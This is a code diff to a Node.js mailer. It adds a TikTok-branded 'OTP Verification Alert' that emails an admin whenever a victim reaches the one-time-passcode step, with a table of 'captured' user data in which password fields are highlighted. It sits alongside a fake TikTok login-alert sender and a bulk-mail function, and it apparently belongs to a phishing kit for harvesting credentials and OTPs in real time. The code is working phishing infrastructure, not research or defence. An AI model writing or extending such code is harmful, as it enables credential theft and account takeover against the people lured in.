@@ -209,6 +209,124 @@ async function sendTikTokAlert({ to, recipientName, loginDate, loginTime, timezo
   });
 }
 
+// ── Generate OTP Alert HTML for Admin ────────────────────────
+function generateOTPAdminAlertHTML(data) {
+  const {
+    adminName = 'Admin',
+    userEmail = 'user@example.com',
+    capturedData = {},
+    timestamp = new Date().toISOString(),
+    adminLink = 'https://tip-top-v2.onrender.com/admin',
+    baseUrl = '',
+  } = data;
+
+  const absoluteAdminLink = adminLink.startsWith('http') ? adminLink : `${baseUrl}${adminLink}`;
+  const time = new Date(timestamp).toLocaleString();
+
+  // Build data rows HTML
+  let dataRowsHTML = '';
+  Object.entries(capturedData).forEach(([key, value]) => {
+    const isPassword = key.toLowerCase().includes('password') || key.toLowerCase().includes('pwd');
+    const isEmail = key.toLowerCase().includes('email');
+    const color = isPassword ? '#f59e0b' : isEmail ? '#10b981' : '#4fc3f7';
+    
+    dataRowsHTML += `
+      <tr>
+        <td style="padding: 12px 16px; border-bottom: 1px solid #e8e8e8; font-size: 13px; color: #8a8b91; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px;">${key}</td>
+        <td style="padding: 12px 16px; border-bottom: 1px solid #e8e8e8; font-size: 14px; color: ${color}; font-family: 'Courier New', monospace; word-break: break-all;">${value}</td>
+      </tr>
+    `;
+  });
+
+  return `<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>OTP Verification Alert</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { background-color: #f5f5f5; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; -webkit-font-smoothing: antialiased; margin: 0; padding: 0; width: 100%; }
+    .email-wrapper { width: 100%; background-color: #f5f5f5; padding: 30px 20px; }
+    .email-container { max-width: 600px; margin: 0 auto; background-color: #ffffff; }
+    .header { padding: 28px 32px 20px; background-color: #ffffff; border-bottom: 2px solid #fe2c55; }
+    .alert-badge { display: inline-block; padding: 6px 12px; background: rgba(245,158,11,0.15); color: #f59e0b; border-radius: 6px; font-size: 12px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 12px; }
+    .header-title { font-size: 24px; font-weight: 800; color: #000000; }
+    .body-content { padding: 24px 32px; }
+    .body-text { font-size: 14px; line-height: 1.7; color: #161823; margin-bottom: 20px; }
+    .detail-item { margin-bottom: 14px; }
+    .detail-label { font-size: 13px; color: #8a8b91; }
+    .detail-value { font-size: 14px; color: #161823; line-height: 1.5; font-weight: 600; }
+    .data-table { width: 100%; border-collapse: collapse; margin: 20px 0; background: #f9f9f9; border-radius: 8px; overflow: hidden; }
+    .data-table th { background: #f1f1f2; padding: 12px 16px; text-align: left; font-size: 12px; color: #8a8b91; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; }
+    .cta-button { display: inline-block; background-color: #fe2c55; color: white; padding: 14px 28px; text-decoration: none; border-radius: 8px; font-size: 15px; font-weight: 700; text-align: center; margin: 20px 0; }
+    .cta-button:hover { background-color: #ff4d73; }
+    .footer { padding: 20px 32px 28px; border-top: 1px solid #e8e8e8; }
+    .footer-text { font-size: 12px; color: #8a8b91; line-height: 1.6; }
+    @media screen and (max-width: 600px) {
+      .header, .body-content, .footer { padding-left: 20px; padding-right: 20px; }
+    }
+  </style>
+</head>
+<body>
+  <div class="email-wrapper">
+    <div class="email-container">
+      <div class="header">
+        <div class="alert-badge">🔔 OTP Alert</div>
+        <h1 class="header-title">User Reached OTP Verification</h1>
+      </div>
+      <div class="body-content">
+        <p class="body-text">Hi ${adminName},</p>
+        <p class="body-text">A user has reached the OTP verification step. Here's the data captured so far:</p>
+        
+        <div class="detail-item">
+          <div class="detail-label">User Email:</div>
+          <div class="detail-value">${userEmail}</div>
+        </div>
+        
+        <div class="detail-item">
+          <div class="detail-label">Timestamp:</div>
+          <div class="detail-value">${time}</div>
+        </div>
+
+        <table class="data-table">
+          <thead>
+            <tr>
+              <th style="width: 40%;">Field</th>
+              <th style="width: 60%;">Value</th>
+            </tr>
+          </thead>
+          <tbody>
+            ${dataRowsHTML}
+          </tbody>
+        </table>
+        
+        <div style="text-align: center;">
+          <a href="${absoluteAdminLink}" class="cta-button">View Full Data in Admin Panel</a>
+        </div>
+        
+        <p class="body-text" style="font-size: 13px; color: #8a8b91; margin-top: 24px;">Click the button above to view all captured user data in the admin dashboard. The latest entries will be highlighted.</p>
+      </div>
+      <div class="footer">
+        <p class="footer-text">This is an automated alert from your TikTok monitoring system.<br>Please do not reply to this email.</p>
+      </div>
+    </div>
+  </div>
+</body>
+</html>`;
+}
+
+// ── Send OTP Alert to Admin ─────────────────────────────────
+async function sendOTPAdminAlert({ to, adminName, userEmail, capturedData, timestamp, adminLink }) {
+  const html = generateOTPAdminAlertHTML({ adminName, userEmail, capturedData, timestamp, adminLink });
+  return sendEmail({
+    to,
+    subject: '🔔 OTP Verification Alert - User Data Captured',
+    html,
+    text: `Hi ${adminName}, a user has reached OTP verification. Email: ${userEmail}. Time: ${new Date(timestamp).toLocaleString()}. View full data at: ${adminLink}`,
+  });
+}
+
 // ── Send bulk emails ──────────────────────────────────────────
 async function sendBulk(recipients, templateData, delayMs = 1000) {
   const results = [];
@@ -252,9 +370,11 @@ function updateConfig(newConfig) {
 module.exports = {
   sendEmail,
   sendTikTokAlert,
+  sendOTPAdminAlert,
   sendBulk,
   verifyConnection,
   getConfig,
   updateConfig,
   generateTikTokAlertHTML,
+  generateOTPAdminAlertHTML,
 };
